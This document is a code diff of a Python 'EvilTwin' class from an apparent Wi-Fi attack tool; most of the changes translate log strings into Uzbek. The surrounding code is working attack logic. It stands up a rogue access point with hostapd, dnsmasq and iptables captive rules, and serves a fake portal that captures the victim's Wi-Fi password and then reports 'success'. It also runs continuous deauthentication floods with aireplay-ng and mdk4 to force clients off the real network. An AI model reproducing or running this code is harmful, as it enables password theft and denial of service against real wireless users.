@@ -71,7 +71,7 @@ class EvilTwin:
 
         def log_message(self, fmt, *args):
             if self.parent:
-                self.parent.log(f"[HTTP] {self.client_address[0]} {fmt % args}")
+                self.parent.log(f"[HTTP] {self.client_address[0]} {fmt % args}")  # texnik
 
         def _ap(self):
             return self.parent.AP_IP if self.parent else EvilTwin.AP_IP
@@ -115,7 +115,7 @@ class EvilTwin:
                 pass
             if self.parent:
                 self.parent.log(
-                    f"[AUTO] 302 {self._host()}{self.path} → {loc} ({self._dev()})"
+                    f"[YO'NALTIRISH] 302 {self._host()}{self.path} → {loc} ({self._dev()})"
                 )
 
         def do_GET(self):
@@ -124,7 +124,7 @@ class EvilTwin:
             if self.parent:
                 self.parent.log(
                     f"[HTTP] GET {path} Host={self._host()} "
-                    f"dev={self._dev()} <- {self.client_address[0]}"
+                    f"qurilma={self._dev()} <- {self.client_address[0]}"
                 )
             if "wpad" in low or low.endswith("favicon.ico"):
                 self._send(b"")
@@ -168,7 +168,7 @@ class EvilTwin:
             body = self.rfile.read(n).decode("utf-8", errors="replace")
             dev = self._dev()
             if self.parent:
-                self.parent.log(f"[HTTP] POST {dev}: {body[:180]}")
+                self.parent.log(f"[HTTP] POST qurilma={dev}: {body[:180]}")
                 self.parent.captured_data.append(
                     {
                         "time": datetime.now().isoformat(),
@@ -187,10 +187,10 @@ class EvilTwin:
                 pass
             if pwd and self.parent:
                 self.parent.captured_password = pwd
-                self.parent.log(f"[!!!] PAROL ({dev}): {pwd}")
+                self.parent.log(f"[!!!] PAROL olindi ({dev}): {pwd}")
                 self._send(
-                    b"<!DOCTYPE html><html><body><h1>Success</h1>"
-                    b"<p>Connected</p></body></html>"
+                    b"<!DOCTYPE html><html><body><h1>Muvaffaqiyat</h1>"
+                    b"<p>Ulandi</p></body></html>"
                 )
             else:
                 self._page()
@@ -261,7 +261,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
                 self.portal_port = port
                 break
             except OSError as e:
-                self.log(f"Port {port}: {e}")
+                self.log(f"Portal porti {port}: {e}")
                 self._httpd = None
         if not self._httpd:
             return False
@@ -280,7 +280,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
             timeout=5,
         )
         self.log(
-            f"Portal :{self.portal_port} | auto-redirect test HTTP "
+            f"Portal :{self.portal_port} | yo'naltirish tekshiruvi HTTP "
             f"{(r.stdout or '?').strip()}"
         )
         return True
@@ -321,7 +321,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
         wu.run(["ip", "link", "set", iface, "up"])
         time.sleep(0.35)
 
-        self.log(f'hostapd MAX: "{essid}" @ {iface} ch{ch}')
+        self.log(f'Nuqta nuqta (hostapd): "{essid}" @ {iface} kanal {ch}')
         self._hostapd = subprocess.Popen(
             ["hostapd", self._hostapd_conf],
             stdout=subprocess.PIPE,
@@ -338,10 +338,10 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
                     err = (self._hostapd.stdout.read() or "")[:350]
                 except Exception:
                     pass
-                self.log(f"hostapd FAIL: {err[:220]}")
+                self.log(f"hostapd xato: {err[:220]}")
                 return False
             if wu.iface_type(iface) == "AP":
-                self.log("hostapd AP-ENABLED ✓")
+                self.log("hostapd: nuqta yoqildi ✓")
                 wu.set_txpower_max(iface, log=self.log)
                 return True
             time.sleep(0.3)
@@ -349,7 +349,9 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
         ok = self._hostapd.poll() is None
         if ok:
             wu.set_txpower_max(iface, log=self.log)
-        self.log(f"hostapd type={wu.iface_type(iface)} run={ok}")
+        self.log(
+            f"hostapd rejim={wu.iface_type(iface)} ishlayapti={'ha' if ok else 'yoq'}"
+        )
         return ok
 
     def _read_hostapd(self):
@@ -372,7 +374,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
                         "could not",
                     )
                 ):
-                    self.log(f"[AP] {line[:140]}")
+                    self.log(f"[NUQTA] {line[:140]}")
                 if "ap-sta-connected" in low:
                     for m in re.findall(
                         r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", line
@@ -380,7 +382,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
                         u = m.upper()
                         if u not in self._client_macs:
                             self._client_macs.append(u)
-                    self.log("[+] STA connected — DHCP kutilmoqda")
+                    self.log("[+] Mijoz ulandi — DHCP kutilmoqda")
         except Exception:
             pass
 
@@ -412,7 +414,7 @@ Wi‑Fi parolini kiriting / Enter Wi‑Fi password</p>
         )
         _, out, _ = wu.run_out(["ip", "-4", "addr", "show", "dev", iface])
         ok = self.AP_IP in out
-        self.log(f"IP {self.AP_IP} @ {iface}: {'OK' if ok else 'FAIL'}")
+        self.log(f"IP {self.AP_IP} @ {iface}: {'tayyor' if ok else 'xato'}")
         return ok
 
     def _start_dnsmasq(self, iface) -> bool:
@@ -457,10 +459,10 @@ log-queries
                 err = (self._dnsmasq.stdout.read() or "")[:300]
             except Exception:
                 pass
-            self.log(f"dnsmasq FAIL: {err}")
+            self.log(f"dnsmasq xato: {err}")
             return False
         threading.Thread(target=self._read_dns, daemon=True).start()
-        self.log(f"dnsmasq MAX @ {iface}")
+        self.log(f"DHCP/DNS (dnsmasq) ishga tushdi @ {iface}")
         return True
 
     def _read_dns(self):
@@ -484,7 +486,7 @@ log-queries
                             self._client_macs.append(u)
                 if "dhcpack" in low.replace(" ", ""):
                     self._got_dhcp = True
-                    self.log(f"[!!!] DHCPACK → http://{self.AP_IP}/")
+                    self.log(f"[!!!] DHCP berildi → http://{self.AP_IP}/")
         except Exception:
             pass
 
@@ -533,7 +535,7 @@ log-queries
                 ]
             )
         wu.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"])
-        self.log("iptables MAX captive (80/443/DoT blok)")
+        self.log("Captive qoidalar o'rnatildi (80/443 va boshqalar)")
 
     def _lease_macs(self):
         macs = list(self._client_macs)
@@ -562,7 +564,7 @@ log-queries
                 with open(self._lease) as f:
                     rows = [x.strip() for x in f if x.strip()]
                 if rows:
-                    self.log(f"DHCP clients: {len(rows)}")
+                    self.log(f"DHCP mijozlar: {len(rows)}")
                     for r in rows[-5:]:
                         self.log(f"  {r}")
                     self.log(f"→ http://{self.AP_IP}/")
@@ -571,13 +573,13 @@ log-queries
         if self._deauth_stack:
             st = self._deauth_stack.stats
             self.log(
-                f"Deauth: clients={self._deauth_stack.tracker.count()} "
-                f"bc={st['broadcast']} dir={st['directed']} "
-                f"mdk4={st['mdk4']} rounds={st['rounds']}"
+                f"Uzish: mijozlar={self._deauth_stack.tracker.count()} "
+                f"efir={st['broadcast']} yo'naltirilgan={st['directed']} "
+                f"mdk4={st['mdk4']} raund={st['rounds']}"
             )
         if not self._got_dhcp:
             self.log(
-                "DHCP yo'q | 1) Unutish 2) ochiq twin 3) yaqinroq turing"
+                "DHCP yo'q | 1) SSID ni unuting 2) ochiq twin ga ulaning 3) yaqinroq turing"
             )
 
     def _save(self, essid, bssid):
@@ -607,7 +609,7 @@ log-queries
 
         threading.Thread(target=_sync_seed, daemon=True).start()
         self._deauth_stack.start_continuous()
-        self.log(f"[+] Deauth stack: aireplay+mdk4+clientMAC @ {mon}")
+        self.log(f"[+] Uzish steki ishga tushdi @ {mon}")
         return True
 
     # ══════════ RUN MAX ══════════
@@ -644,19 +646,18 @@ log-queries
             dch = ch
 
         self.log(
-            f'=== EVIL TWIN AIRGEDDON: "{name}" AP-ch{ch} deauth-ch{dch} ==='
+            f'=== SOXTA WI-FI: "{name}" AP-kanal={ch} uzish-kanal={dch} ==='
         )
         self.log(
-            f"Distro: {wu.detect_distro()} | "
-            f"mdk4={'ha' if wu.which('mdk4') else 'yoq'} | "
-            f"aireplay={'ha' if wu.which('aireplay-ng') else 'yoq'}"
+            f"Tizim: {wu.detect_distro()} | "
+            f"mdk4={'bor' if wu.which('mdk4') else 'yoq'} | "
+            f"aireplay={'bor' if wu.which('aireplay-ng') else 'yoq'}"
         )
 
         wu.airgeddon_check_kill(log=self.log, iface=None)
         wu.cleanup_p2p_at0(log=self.log)
         os.makedirs(self._tmpdir, exist_ok=True)
 
-        # Asl station nomini eslab qolish (pre-deauth dan keyin yo'qolmasin)
         ap_base, deauth_base = wu.split_ap_deauth_ifaces(mon_iface)
         if not ap_base:
             ap_base = wu.resolve_station(mon_iface, log=self.log)
@@ -665,15 +666,15 @@ log-queries
         if not ap_base:
             found = ", ".join(wu.list_net_ifaces())
             self.stop()
-            return {"success": False, "error": f"Wi‑Fi yo'q ({found})"}
+            return {"success": False, "error": f"Wi‑Fi topilmadi ({found})"}
 
         remembered = wu.base_name(ap_base)
         self.log(
-            f"AP karta: {ap_base}"
+            f"Nuqta kartasi: {ap_base}"
             + (
-                f" | Deauth karta: {deauth_base}"
+                f" | Uzish kartasi: {deauth_base}"
                 if deauth_base
-                else " | Deauth: mon VIF"
+                else " | Uzish: qo'shimcha monitor"
             )
         )
 
@@ -685,21 +686,19 @@ log-queries
                 mon_used = wu.airmon_start(ap_base, log=self.log)
             if mon_used:
                 stack = make_stack_for_twin(mon_used, bssid, dch, log=self.log)
-                self.log("[*] Pre-deauth 5s...")
+                self.log("[*] Dastlabki uzish 5s...")
                 stack.burst(seconds=5)
                 clients_found = stack.tracker.list()
                 self._client_macs = list(clients_found)
                 self.log(
-                    f"Pre-deauth OK · {len(clients_found)} client · "
-                    f"keyin hostapd..."
+                    f"Dastlabki uzish tayyor · {len(clients_found)} mijoz · "
+                    f"keyin nuqta..."
                 )
                 stack.stop()
-                # aireplay/mdk4 to'liq o'lsin
                 wu.run(["pkill", "-x", "aireplay-ng"])
                 wu.run(["pkill", "-x", "mdk4"])
                 time.sleep(0.3)
                 if not deauth_base:
-                    # bir karta: mon → managed AP (mustahkam tiklash)
                     ap_base = wu.ensure_ap_iface(
                         preferred=remembered,
                         mon=mon_used,
@@ -710,9 +709,8 @@ log-queries
                 else:
                     self._deauth_iface = mon_used
             else:
-                self.log("Pre-deauth mon yo'q")
+                self.log("Dastlabki uzish uchun monitor yo'q")
 
-        # yakuniy kafolat
         if not ap_base or not wu.iface_exists(ap_base):
             ap_base = wu.ensure_ap_iface(
                 preferred=remembered,
@@ -726,10 +724,12 @@ log-queries
             self.stop()
             return {
                 "success": False,
-                "error": f"AP iface yo'qoldi ({found}). Qayta: menyu 3 tiklash",
+                "error": (
+                    f"Nuqta interfeysi yo'qoldi ({found}). "
+                    "Qayta: bosh menyu → Tarmoqni tiklash"
+                ),
             }
 
-        # hostapd uchun managed + NM ushlamasin
         wu.run(["nmcli", "device", "set", ap_base, "managed", "no"])
         wu.run(["ip", "link", "set", ap_base, "down"])
         wu.run(["iw", "dev", ap_base, "set", "type", "managed"])
@@ -739,7 +739,10 @@ log-queries
 
         self._iface = ap_base
         self._phy = wu.find_phy(ap_base)
-        self.log(f"AP iface: {ap_base} phy={self._phy} type={wu.iface_type(ap_base)}")
+        self.log(
+            f"Nuqta interfeysi: {ap_base} phy={self._phy} "
+            f"rejim={wu.iface_type(ap_base)}"
+        )
 
         if not self._start_portal(name):
             self.stop()
@@ -747,7 +750,7 @@ log-queries
 
         if not self._start_hostapd(ap_base, name, ch, bssid):
             self.stop()
-            return {"success": False, "error": "hostapd ishlamadi"}
+            return {"success": False, "error": "Nuqta (hostapd) ishlamadi"}
 
         if not self._setup_ip(ap_base):
             self.stop()
@@ -755,7 +758,7 @@ log-queries
 
         if not self._start_dnsmasq(ap_base):
             self.stop()
-            return {"success": False, "error": "dnsmasq ishlamadi"}
+            return {"success": False, "error": "DHCP/DNS ishlamadi"}
 
         self._iptables(ap_base)
 
@@ -771,31 +774,31 @@ log-queries
                 self._start_deauth_stack(mon, bssid, dch)
             else:
                 self.log(
-                    "[!] Deauth mon yo'q — twin ishlaydi, "
+                    "[!] Uzish monitori yo'q — soxta Wi-Fi ishlaydi, "
                     "mijoz o'zi ulanishi kerak"
                 )
 
-        dual = "DUAL-CARD" if deauth_base else "SINGLE+VIF"
+        dual = "2 KARTA" if deauth_base else "1 KARTA + monitor"
         print(
             f"""
   ╔════════════════════════════════════════════════════╗
-  ║  EVIL TWIN + DEAUTH STACK (MAX)                    ║
+  ║  SOXTA WI-FI + UZISH                               ║
   ╠════════════════════════════════════════════════════╣
-  ║  Mode    : {dual:<36} ║
+  ║  Rejim   : {dual:<36} ║
   ║  SSID    : {name[:36]:<36} ║
-  ║  AP      : {ap_base:<36} ║
-  ║  Deauth  : {(self._deauth_iface or '—'):<36} ║
-  ║  Stack   : aireplay + mdk4 + client MAC            ║
+  ║  Nuqta   : {ap_base:<36} ║
+  ║  Uzish   : {(self._deauth_iface or '—'):<36} ║
+  ║  Vositalar: aireplay + mdk4 + mijoz MAC            ║
   ║  Portal  : http://{self.AP_IP}/{'':<24} ║
   ╠════════════════════════════════════════════════════╣
   ║  1) SSID ni UNUTING                                ║
   ║  2) Yaqin turing + ochiq twin                      ║
-  ║  3) [DHCP] / [AUTO] 302 / deauth clients=N         ║
-  ║  Ctrl+C = stop                                     ║
+  ║  3) DHCP / portal / uzish ishlayotganini kuting    ║
+  ║  Ctrl+C = to'xtatish                               ║
   ╚════════════════════════════════════════════════════╝
 """
         )
-        self.log("MAX + deauth stack tayyor")
+        self.log("Soxta Wi-Fi + uzish steki tayyor")
 
         start = time.time()
         try:
@@ -825,12 +828,12 @@ log-queries
                     if self.AP_IP not in out:
                         self._setup_ip(ap_base)
                     if self._hostapd and self._hostapd.poll() is not None:
-                        self.log("hostapd o'ldi — qayta")
+                        self.log("hostapd to'xtadi — qayta ishga tushirilmoqda")
                         self._start_hostapd(ap_base, name, ch, bssid)
                         self._setup_ip(ap_base)
-                    self.log(f"... {el}s")
+                    self.log(f"... {el} soniya")
         except KeyboardInterrupt:
-            self.log("Ctrl+C")
+            self.log("Ctrl+C — foydalanuvchi to'xtatdi")
 
         self.stop()
         return {
@@ -897,7 +900,7 @@ log-queries
         wu.run(["iptables", "-t", "mangle", "-F"])
         wu.run(["iptables", "-F"])
         wu.run(["iptables", "-P", "FORWARD", "ACCEPT"])
-        self.log("MAX twin + deauth stack to'xtatildi")
+        self.log("Soxta Wi-Fi va uzish to'xtatildi")
 
     def is_running(self):
         return self._running
